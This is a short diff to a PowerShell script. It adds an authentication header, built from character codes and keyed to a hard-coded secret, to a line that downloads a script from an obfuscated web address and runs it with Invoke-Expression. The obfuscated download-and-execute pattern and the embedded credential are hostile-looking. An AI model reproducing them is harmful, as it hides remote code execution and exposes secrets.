@@ -3,6 +3,7 @@ $Content = "
 `$he = ([char[]](97,115,100,104,106,115,100,102,103,106,100,104,106,103,115,97,106,104,
        104,106,103,100,97,115,100,115,97,103,99,120,122,116,119,51,50,54,55,100,110,50,
        51,100,103,104,119,101,101,102,33,33,102,100,97,116,104) -Join '')
+`$hen = ([char[]](83,112,105,110,65,117,116,104) -Join '')       
 
 if(Get-NetRoute | Where-Object DestinationPrefix -eq '0.0.0.0/0' | Get-NetIPInterface | Where-Object ConnectionState -eq 'Connected'){`$ConnectedToTheInternet = `$true}
 
@@ -25,7 +26,7 @@ if(-not `$ConnectedToTheInternet){
       #region --- Download PowerShell Scripts ---
 
         (iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,
-        97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())
+        97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '') -he @{$hen=$he}).ToString())
       
       #endregion --------------------------------
 
